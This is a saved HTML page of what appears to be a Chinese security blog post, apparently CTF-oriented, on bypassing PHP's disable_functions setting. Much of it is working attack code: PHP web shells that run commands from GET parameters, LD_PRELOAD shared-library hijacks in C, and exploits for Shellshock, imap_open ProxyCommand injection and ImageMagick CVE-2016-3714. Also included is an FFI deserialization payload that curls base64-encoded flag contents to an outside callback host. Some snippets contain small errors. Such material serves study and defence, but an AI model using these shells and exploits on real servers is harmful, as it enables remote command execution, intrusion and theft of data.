@@ -1,0 +1,783 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PHP Bypass Disable_functions | 3ND</title>
+<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PHP Bypass Disable_functions | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="disable_functions 是 php.ini 中的一个设置选项，可以用来设置 PHP 环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。
+常见的绕过 disable_functions 的手法：..." />
+    <meta name="keywords" content="PHP" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://github.com/inspiringz/inspiringz.github.io">
+  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/inspiringz" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PHP Bypass Disable_functions
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-11-06
+              </span>
+              <span>
+                26 min read
+              </span>
+              <span class="page-view" key="20191106222351" title="PHP Bypass Disable_functions">
+              </span>
+              
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/php/" class="post-tag">
+                  # PHP
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <p><code>disable_functions</code> 是 php.ini 中的一个设置选项，可以用来设置 PHP 环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。</p>
+<p>常见的绕过 <code>disable_functions</code> 的手法：</p>
+<ol>
+<li>
+<p>寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼.</p>
+</li>
+<li>
+<p>利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果.</p>
+</li>
+<li>
+<p>mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制（让特定扩展名的文件直接和php-cgi通信）.</p>
+</li>
+<li>
+<p>攻击后端组件，寻找存在命令注入的 Web 应用常用的后端组件，如 ImageMagick 的魔图漏洞、 bash 的破壳漏洞等.</p>
+</li>
+</ol>
+<h2 id="0x01-blacklist">0x01 BlackList</h2>
+<p>观察 <code>disable_functions</code> 的黑名单下是否有漏网之鱼，从而加以利用。</p>
+<pre><code class="language-php">assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``
+</code></pre>
+<p>eg: pctnl_exec(): <code>--enable-pcntl</code></p>
+<figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-11-20-08-39-44.png" alt="" loading="lazy"></figure>
+<pre><code class="language-php">&lt;?php pcntl_exec(&quot;/bin/cat&quot;, array(&quot;/flag&quot;));?&gt;
+</code></pre>
+<h2 id="0x02-windows-com">0x02 Windows COM</h2>
+<p>Require:</p>
+<ol>
+<li>
+<p>Windows: <code>C:\Windows\System32\wshom.ocx</code>（默认存在）</p>
+</li>
+<li>
+<p>PHP.ini: <code>com.allow_dcom = true</code> （默认关闭）-&gt; Com_dotnet: extension=php_com_dotnet.dll</p>
+</li>
+</ol>
+<pre><code class="language-php">&lt;?php
+$command = $_GET['cmd'];
+$wsh = new COM('WScript.shell'); // new COM Obj
+$exec = $wsh-&gt;exec(&quot;cmd /c&quot;.$command); // exec command
+$stdout = $exec-&gt;StdOut();
+$stroutput = $stdout-&gt;ReadAll();
+echo $stroutput;
+</code></pre>
+<h2 id="0x03-ld_preload">0x03 LD_PRELOAD</h2>
+<p><code>LD_PRELOAD</code> 是 Linux 中的环境变量，可以设置成一个指定库的路径，动态链接时较其他库有着更高的优先级，允许预加载指定库中的函数和符号覆盖掉后续链接的库中的函数和符号。即可以通过重定向共享库函数来进行运行时修复。这项技术可用于绕过反调试代码，也可以用作用户机 rootkit。</p>
+<h3 id="劫持-getuid">劫持 getuid()</h3>
+<p><strong>Require:</strong> Linux 中已安装并启用 sendmail 程序。</p>
+<p>PHP 的 mail() 函数在执行过程中会默认调用系统程序 /usr/sbin/sendmail，而/usr/sbin/sendmail 会调用 getuid()。如果我们能通过 LD_PRELOAD 的方式来劫持getuid()，再用 mail() 函数来触发 sendmail程序进而执行被劫持的 getuid()，从而执行恶意代码。</p>
+<p>* 当 <code>error_log</code>的第二个参数 <code>message_type</code> 的值为 1 的时候，会调用 mail 函数的同一个内置函数 sendmail：</p>
+<pre><code class="language-php">error_log ( string $message [, int $message_type = 0 [, string $destination [, string $extra_headers ]]] ) : bool
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-11-20-09-27-50.png" alt="" loading="lazy"></figure>
+<pre><code class="language-php">PHP mail() -&gt; /usr/sbin/sendmail -&gt; getuid() -&gt; exec()
+</code></pre>
+<p><strong>攻击思路:</strong></p>
+<ol>
+<li>
+<p>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 evil.so；</p>
+</li>
+<li>
+<p>运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 evil.so，以便后续启动新进程时优先加载该共享对象；</p>
+</li>
+<li>
+<p>运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 evil.so 中的同名 getuid() 所劫持；达到不调用 PHP 的各种命令执行函数（system(), exec()...etc）仍可执行系统命令的目的。</p>
+</li>
+</ol>
+<p><strong>调用过程分析：</strong></p>
+<p>查看 sendmail 可能调用的系统 API 明细；</p>
+<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-11-18-11-02-07.png" alt="" loading="lazy"></figure>
+<p><code>man 2 getuid</code> 查看 getuid 函数原型：</p>
+<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-11-18-11-04-19.png" alt="" loading="lazy"></figure>
+<p>查看 PHP mail() 是否启动新进程:</p>
+<pre><code class="language-php">&lt;?php mail('a','b','c','d'); ?&gt;
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-11-18-11-15-59.png" alt="" loading="lazy"></figure>
+<p>* 留意到 <code>/bin/bash</code> 启动时同样调用了 <code>getuid</code>（那么如果别的环境和上述情况一致，在 mail() 中存在启动 execve 调用了 /bin/sh 程序来间接调用 sendmail 的这种情况，即使目标系统未安装或未开启 sendmail 程序，我仍然可以通过 PHP 的 mail() 函数来触发调用了 /bin/sh 程序的 execve，从而调用 getuid() 达到执行劫持函数的目的。）</p>
+<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-11-18-11-18-23.png" alt="" loading="lazy"></figure>
+<p><strong>攻击利用:</strong></p>
+<p>编写 evil.c，劫持 getuid()，获取 LD_PRELOAD 环境变量并预加载恶意的共享库，再删除环境变量 LD_PRELOAD，最后执行由 EVIL_CMDLINE 环境变量获取的系统命令：</p>
+<pre><code class="language-c++">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int geteuid() {
+        const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);
+        if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }
+        unsetenv(&quot;LD_PRELOAD&quot;); //在新进程启动前取消 LD_PRELOAD,防止陷入无限循环
+        system(cmdline);
+}
+</code></pre>
+<p>编译为共享对象（<code>-fPIC</code> 作用于编译阶段，告诉编译器产生与位置无关代码(Position-Independent Code)，则产生的代码中，没有绝对地址，全部使用相对地址，故而代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。）：</p>
+<pre><code class="language-bash">gcc -shared -fPIC test.c -o test.so
+</code></pre>
+<p>Shell.php:</p>
+<pre><code class="language-php">&lt;?php
+    echo &quot;&lt;p&gt; &lt;b&gt;Example&lt;/b&gt;: http://test.com/exp.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/exp.so &lt;/p&gt;&quot;;
+    $cmd = $_GET[&quot;cmd&quot;]; //待执行的系统命令
+    $out_path = $_GET[&quot;outpath&quot;]; //保存命令执行输出结果的文件路径,便于在页面上显示
+    /*是否有读写权限、web是否可跨目录访问、文件将被覆盖和删除...*/
+    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;
+    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;
+    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);
+    $so_path = $_GET[&quot;sopath&quot;]; //劫持系统函数的共享对象的绝对路径
+    putenv(&quot;LD_PRELOAD=&quot; . $so_path);
+    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);
+    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; 
+    unlink($out_path);
+</code></pre>
+<p><strong>流程:</strong></p>
+<pre><code class="language-php">putenv() -&gt; LD_PRELOAD(evil.so) -&gt; EVIL_CMDLINE=command -&gt; mail() -&gt; sendmail() -&gt; getuid() -&gt; evil.so -&gt; system() &gt; /tmp/output
+</code></pre>
+<h3 id="劫持启动进程">劫持启动进程</h3>
+<p><strong>劫持 <code>getuid()</code> 的缺陷：</strong></p>
+<ol>
+<li>
+<p>Linux 未安装或启用 sendmail.</p>
+</li>
+<li>
+<p>由于未将主机名添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts.</p>
+</li>
+</ol>
+<p>回到 <code>LD_PRELOAD</code> 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！</p>
+<p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为。</p>
+<p>此外，通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code>，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，需要找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 <code>extern char** environ</code>！实际上，<code>unsetenv()</code> 就是对 <code>environ</code> 的简单封装实现的环境变量删除功能。</p>
+<p><strong>攻击利用:</strong></p>
+<p>bypass_disablefunc.c:</p>
+<pre><code class="language-c++">#define _GNU_SOURCE
+
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+
+extern char** environ;
+
+__attribute__ ((__constructor__)) void preload (void)
+{
+    // get command line options and arg
+    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);
+
+    // unset environment variable LD_PRELOAD.
+    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some 
+    // distribution (e.g., centos), I need crafty trick.
+    int i;
+    for (i = 0; environ[i]; ++i) {
+            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) {
+                    environ[i][0] = '\0';
+            }
+    }
+
+    // executive command
+    system(cmdline);
+}
+</code></pre>
+<p>编译 C 文件为共享对象文件:</p>
+<pre><code class="language-bash">gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so
+</code></pre>
+<p>Shell 同劫持 getuid() 的 Shell.php。</p>
+<h2 id="0x04-php-74-ffi">0x04 PHP 7.4 FFI</h2>
+<p><code>FFI</code>（Foreign Function Interface），即外部函数接口，允许从用户区调用 C 代码。简单地说，就是一项让你在 PHP 里能够调用 C 代码的技术。</p>
+<p>当 PHP 所有的命令执行函数被禁用后，通过 PHP 7.4 的新特性 FFI 可以实现用 PHP 代码调用 C 代码的方式，先声明 C 中的命令执行函数，然后再通过 FFI 变量调用该C 函数即可 Bypass disable_functions。</p>
+<p>具体可参考：</p>
+<p>Require:</p>
+<ol>
+<li>
+<p><code>opcache.preload</code> 启用. (指定将在服务器启动时编译和执行的PHP文件，文件中定义的所有函数和大多数类都将永久加载到 PHP 的函数和类表中，并在将来的任何请求的上下文中永久可用)。</p>
+</li>
+<li>
+<p><code>FFI support = enable</code>。</p>
+</li>
+</ol>
+<p>RCTF 2019 - nextphp 解题思路：</p>
+<p>可利用点：</p>
+<ol>
+<li>Preload 配置已经将 preload.php 预加载到内存中，可直接利用其中的类方法；</li>
+<li>preload.php 中的 unserialize() 函数会调用 run()，而 run()存在任意函数调用风险；</li>
+<li>index.php 中 eval 会执行 PHP 代码，会帮助我们执行 preload.php 中的反序列化操作；</li>
+</ol>
+<p>攻击思路：</p>
+<ol>
+<li>先利用 FFI 特性构造恶意序列化内容，用 PHP 通过 FFI 声明和调用 C 中的 system() 函数；</li>
+<li>利用 index.php 中的 eval 来执行反序列化操作；</li>
+<li>最后调用 FFI 中声明的 system()函数执行命令；</li>
+</ol>
+<p>serialize exp:</p>
+<pre><code class="language-php">&lt;?php
+final class A implements Serializable {
+    protected $data = [
+        'ret' =&gt; null,
+        'func' =&gt; 'FFI::cdef',
+        'arg' =&gt; 'int system(char *command);'
+    ];
+
+    private function run () {
+        $this-&gt;data['ret'] = $this-&gt;data['func']($this-&gt;data['arg']);
+    }
+
+    public function serialize () {
+        return serialize($this-&gt;data);
+    }
+
+    public function unserialize($payload) {
+        $this-&gt;data = unserialize($payload);
+        $this-&gt;run();
+    }
+}
+
+echo(serialize(new A()));
+?&gt;
+</code></pre>
+<p>利用 index.php 的 eval 来限制执行反序列化操作，然后触发 run() 函数来调用 FFI::cdef 声明 C 中的 system() 函数，然后通过 FFI 变量调用已声明的 system() 来执行任意命令，因为可能有特殊编码这里就进行 base64 加密传送回来. Payload（URL编码后发送）：</p>
+<pre><code class="language-php">$a=unserialize('C:1:&quot;A&quot;:89:{a:3:{s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;\}\}');$a-&gt;ret-&gt;system('curl xx.ceye.io/?c=`cat /flag|base64`');
+</code></pre>
+<h2 id="0x05-bash-shellshock">0x05 Bash ShellShock</h2>
+<p>这种利用方法的前提是目标 OS 存在 Bash破壳（CVE-2014-6271）漏洞，该漏洞的具体介绍可参考: <a href="https://www.freebuf.com/news/48331.html">破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之一</a></p>
+<p><strong>Bash 破壳漏洞成因</strong>：目前的 Bash 使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以 <code>(){</code> 开头定义的环境变量在命令 ENV 中解析成函数后，Bash 执行并未退出，而是继续解析并执行 shell 命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p>
+<figure data-type="image" tabindex="7"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-11-20-08-11-20.png" alt="" loading="lazy"></figure>
+<p>mail.c 中 mail() 函数的第五个参数 extra_cmd:</p>
+<pre><code class="language-c++">if (extra_cmd != NULL) {
+	spprintf(&amp;sendmail_cmd, 0,&quot;%s %s&quot;, sendmail_path, extra_cmd);
+} else {
+	sendmail_cmd = sendmail_path;
+}
+</code></pre>
+<p>当 extra_cmd（用户传入的一些额外参数）存在的时候，调用 spprintf() 将 sendmail_path 和 extra_cmd 组合成真正执行的命令行 sendmail_cmd。 然后将sendmail_cmd 丢给 popen() 执行：</p>
+<pre><code class="language-c++">#ifdef PHP_WIN32
+	sendmail = popen_ex(sendmail_cmd,&quot;wb&quot;, NULL, NULL TSRMLS_CC);
+#else
+    /* Since popen() doesn't indicate if theinternal fork() doesn't work
+    *(e.g. the shell can't be executed) we explicitly set it to 0 to be
+    *sure we don't catch any older errno value. */
+    errno = 0;
+    sendmail = popen(sendmail_cmd,&quot;w&quot;);
+#endif
+</code></pre>
+<p>如果系统默认 sh 是 bash，popen() 会派生 bash 进程，而我们刚才提到的 CVE-2014-6271 漏洞，直接就导致我们可以利用 mail() 函数执行任意命令，绕过disable_functions 的限制。</p>
+<p>同样，我们搜索一下 php 的源码，可以发现，明里调用 popen 派生进程的 php函数还有 imap_mail，如果你仅仅通过禁用 mail 函数来规避这个安全问题，那么 imap_mail 是可以做替代的。当然，php 里还可能有其他地方有调用 popen 或其他能够派生 bash 子进程的函数，通过这些地方，都可以通过破壳漏洞执行命令的。简单的禁用 mail() 函数，在上述情况中是不能抵御 bypass disable_functions 的。</p>
+<p>exp:</p>
+<pre><code class="language-php">?php 
+# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
+# Google Dork: none 
+# Date: 10/31/2014 
+# Exploit Author: Ryan King (Starfall) 
+# Vendor Homepage: http://php.net 
+# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
+# Version: 5.* (tested on 5.6.2) 
+# Tested on: Debian 7 and CentOS 5 and 6 
+# CVE: CVE-2014-6271 
+
+function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
+   $tmp = tempnam(&quot;.&quot;,&quot;data&quot;); 
+   putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;); 
+   // In Safe Mode, the user may only alter environment variableswhose names 
+   // begin with the prefixes supplied by this directive. 
+   // By default, users will only be able to set environment variablesthat 
+   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
+   // PHP will let the user modify ANY environment variable! 
+   mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don't actuallysend any mail 
+   $output = @file_get_contents($tmp); 
+   @unlink($tmp); 
+   if($output != &quot;&quot;) return $output; 
+   else return &quot;No output, or not vuln.&quot;; 
+} 
+echo shellshock($_REQUEST[&quot;cmd&quot;]); 
+?&gt;
+</code></pre>
+<h2 id="0x06-imap_open">0x06 imap_open()</h2>
+<p>Require:</p>
+<ol>
+<li>
+<p>安装 PHP 的 imap 扩展：<code>apt-get install php-imap</code>。</p>
+</li>
+<li>
+<p>在 php.ini 中开启 <code>imap.enable_insecure_rsh = On</code>。</p>
+</li>
+</ol>
+<p><strong>基本原理</strong>：</p>
+<p>PHP 的 imap_open 函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的 imap_open 函数在将邮箱名称传递给rsh 或 ssh 命令之前不正确地过滤邮箱名称。如果启用了 rsh 和 ssh 功能并且 rsh 命令是 ssh 命令的符号链接，则攻击者可以通过向目标系统发送包含<code>-oProxyCommand</code> 参数的恶意 IMAP 服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的 exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意 shell 命令。利用此漏洞的功能代码是 Metasploit Framework 的一部分。</p>
+<p>imap_open() 函数会调用到 rsh 的程序，而该程序中会调用 execve 系统调用来实现 rsh 的调用，其中的邮件地址参数是由 imap_open() 函数的 mailbox 参数传入，同时，由于 rsh 命令是 ssh 命令的符号链接，所以当我们利用 ssh 的 <code>-oProxyCommand</code> 参数来构造恶意 mailbox 参数时就能执行恶意命令。</p>
+<p>ProxyCommand指定用于连接服务器的命令：</p>
+<pre><code class="language-bash">$ ssh -oProxyCommand=&quot;touch flag&quot; localhost
+ssh_exchange_identification: Connection closed by remote host
+$ ls | grep flag
+flag
+</code></pre>
+<p>具体分析可参考：<a href="https://xz.aliyun.com/t/4113">如何在PHP安装中绕过disable_functions</a>.</p>
+<p><strong>imap_open()</strong>:</p>
+<pre><code class="language-php">resource imap_open ( string $mailbox , string $username , string $password [, int $options = 0 [, int $n_retries = 0 [, array $params = NULL ]]] )
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-11-20-08-22-02.png" alt="" loading="lazy"></figure>
+<p>mailbox 参数的值由服务器名和服务器上的 mailbox 文件路径所组成，INBOX 代表的是当前用户的个人邮箱。比如，我们可以通过如下方式来设置 mailbox 参数：</p>
+<pre><code class="language-php">$mbox = imap_open (&quot;{localhost:993/PROTOCOL/FLAG}INBOX&quot;, &quot;user_id&quot;, &quot;password&quot;);
+</code></pre>
+<p>在括号内的字符串中，我们可以看到服务器名称（或者IP地址）、端口号以及协议名称。用户可以在协议名后设置标志（第3个参数）。</p>
+<p>这里不能直接将 ProxyCommand 命令直接转移到 PHP 脚本来代替 imap_open 服务器地址，因为在解析时它会将 <strong>空格解释为分隔符</strong> 和 <strong>斜杠作为标志</strong>。但是我们可以使用 <code>\$IFS</code> 这个shell变量来替换 <code>空格</code> 符号或使用 <code>\t</code> 替换。还可以在 bash 中使用 Ctrl + V 热键和 Tab 键插入标签。要想绕过斜杠，可以使用 <code>base64编码</code> 和相关命令对其进行解码。</p>
+<p>exp:</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+if (!function_exists('imap_open')) {
+        die(&quot;no imap_open function!&quot;);
+}
+$server = &quot;x -oProxyCommand=echo\t&quot; . base64_encode($_GET['cmd'] . &quot;&gt;/tmp/cmd_result&quot;) . &quot;|base64\t-d|sh}&quot;;
+//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . &quot;&gt;/tmp/cmd_result&quot;) . '|base64$IFS$()-d|sh}';
+imap_open('{' . $server . ':143/imap}INBOX', '', ''); // or var_dump(&quot;\n\nError: &quot;.imap_last_error());
+sleep(5); //imap_open() 执行时进行 DNS 轮询存在延时，等待 imap_open() 执行完毕
+echo file_get_contents(&quot;/tmp/cmd_result&quot;);
+?&gt;
+</code></pre>
+<h2 id="0x07-imagemagick">0x07 ImageMagick</h2>
+<p>ImageMagick 是一个功能强大的开源图形处理软件,可以用来读、写和处理超过90种的图片文件,包括流行的 JPEG、GIF、 PNG、PDF 以及 PhotoCD 等格式。使用它可以对图片进行切割、旋转、组合等多种特效的处理。</p>
+<p>ImageMagick 之所以支持那么多的文件格式,是因为他内置了非常多的图像处理库,对于这些图像处理库,ImageMagick 给他起了个名字叫做 <code>Delegate</code> (委托),每个 Delegate 对应一种格式的文件,然后通过系统的 system() 命令来调用外部的程序对文件进行处理。</p>
+<h3 id="command-injection">Command Injection</h3>
+<p><strong><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">CVE-2016-3714</a> ImageMagick 命令执行:</strong></p>
+<p>影响版本：</p>
+<ul>
+<li>ImageMagick 6.5.7-8 2012-08-17</li>
+<li>ImageMagick 6.7.7-10 2014-03-06</li>
+<li>低版本至6.9.3-9 released 2016-04-30</li>
+</ul>
+<p>漏洞简述：</p>
+<p>产生原因是因为字符过滤不严谨所导致的执行代码. 对于文件名传递给后端的命令过滤不足,导致允许多种文件格式转换过程中远程执行代码。</p>
+<p><a href="https://www.exploit-db.com/exploits/39766">exp</a>:</p>
+<pre><code class="language-php"># Exploit Title: PHP Imagick disable_functions Bypass
+# Date: 2016-05-04
+# Exploit Author: RicterZ (ricter@chaitin.com)
+# Vendor Homepage: https://pecl.php.net/package/imagick
+# Version: Imagick  &lt;= 3.3.0 PHP &gt;= 5.4
+# Test on: Ubuntu 12.04
+
+# Exploit:
+
+&lt;?php
+# PHP Imagick disable_functions Bypass
+# Author: Ricter &lt;ricter@chaitin.com&gt;
+#
+# $ curl &quot;127.0.0.1:8080/exploit.php?cmd=cat%20/etc/passwd&quot;
+# &lt;pre&gt;
+# Disable functions: exec,passthru,shell_exec,system,popen
+# Run command: cat /etc/passwd
+# ====================
+# root:x:0:0:root:/root:/usr/local/bin/fish
+# daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+# bin:x:2:2:bin:/bin:/bin/sh
+# sys:x:3:3:sys:/dev:/bin/sh
+# sync:x:4:65534:sync:/bin:/bin/sync
+# games:x:5:60:games:/usr/games:/bin/sh
+# ...
+# &lt;/pre&gt;
+echo &quot;Disable functions: &quot; . ini_get(&quot;disable_functions&quot;) . &quot;\n&quot;;
+$command = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';
+echo &quot;Run command: $command\n====================\n&quot;;
+
+$data_file = tempnam('/tmp', 'img');
+$imagick_file = tempnam('/tmp', 'img');
+
+$exploit = &lt;&lt;&lt;EOF
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/image.jpg&quot;|$command&gt;$data_file&quot;)'
+pop graphic-context
+EOF;
+
+file_put_contents(&quot;$imagick_file&quot;, $exploit);
+$thumb = new Imagick();
+$thumb-&gt;readImage(&quot;$imagick_file&quot;);
+$thumb-&gt;writeImage(tempnam('/tmp', 'img'));
+$thumb-&gt;clear();
+$thumb-&gt;destroy();
+
+echo file_get_contents($data_file);
+?&gt;
+</code></pre>
+<h3 id="ld_preload-ghostscript">LD_PRELOAD + ghostscript</h3>
+<p>可参考：<a href="https://xz.aliyun.com/t/4688">TCTF2019 WallBreaker-Easy 解题分析</a>.</p>
+<p>当 ImageMagick 处理到以下 11 种格式文件时，会调用 GhostScript 库进行处理:</p>
+<pre><code class="language-php">EPI EPS EPS2 EPS3 EPSF EPSI EPT PS PS2 PS3 PS4 PDF
+</code></pre>
+<p><strong>攻击流程：</strong></p>
+<ol>
+<li>
+<p>我们应该传入一个 ept 后缀文件和一个编译好的 so 文件;</p>
+</li>
+<li>
+<p>然后写一个 php 文件通过 putenv 函数修改 LD_PRELOAD 加载该 so;</p>
+</li>
+<li>
+<p>接着 php 里创建一个 Imagick 对象处理该 ept 文件，此时由于该后缀 imagemagick 会调用 ghostscript 库对该文件进行处理;</p>
+</li>
+<li>
+<p>而编译好的 so 文件其实作用在于重新编译了 ghostscript 运行过程中要调用的 fflush 方法，我们将想执行的命令写入该方法中就能实现命令执行的效果。</p>
+</li>
+</ol>
+<p>查看是否调用 <code>GhostScript</code>:</p>
+<pre><code class="language-bash">convert 1.png ept:1.ept
+strace -f php image.php 2&gt;&amp;1 | grep -C2 execve
+</code></pre>
+<p>查看 <code>/usr/bin/gs</code> 看一下这个程序都有哪些符号：</p>
+<figure data-type="image" tabindex="9"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-11-20-10-02-15.png" alt="" loading="lazy"></figure>
+<p>从符号中可以看出他调用的库函数，选择 <code>fflush</code> 这个函数来进行劫持：</p>
+<pre><code class="language-c++">#include &lt;string.h&gt;
+void payload() {
+    const char* cmd = getenv('CMD')
+    system(cmd);
+}
+int fflush() {
+    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    payload();
+}
+</code></pre>
+<p>编译生成共享库对象：</p>
+<pre><code class="language-bash">gcc -shared -fPIC test.c -o hack.so
+</code></pre>
+<p>Payload:</p>
+<pre><code class="language-php">putenv('LD_PRELOAD=/tmp/3accb9900a8be5421641fb31e6861f33/hack.so'); 
+putenv('CMD=/readflag &gt; /tmp/3accb9900a8be5421641fb31e6861f33/flag.txt');
+$img = new Imagick('/tmp/3accb9900a8be5421641fb31e6861f33/1.ept');
+</code></pre>
+<h3 id="ld_preload-ffpmeg">LD_PRELOAD + ffpmeg</h3>
+<p>当 Imagick 处理的文件是如下后缀的时候，就会调用外部程序 ffmpeg 去处理该文件:</p>
+<pre><code class="language-php">wmv mov m4v m2v mp4 mpg mpeg mkv avi 3g2 3gp
+</code></pre>
+<ul>
+<li><a href="https://hxp.io/blog/53/0CTF-Quals-2019-Wallbreaker-easy-writeup/">Link</a></li>
+</ul>
+<h3 id="覆盖-path-ghostscript">覆盖 Path + ghostscript</h3>
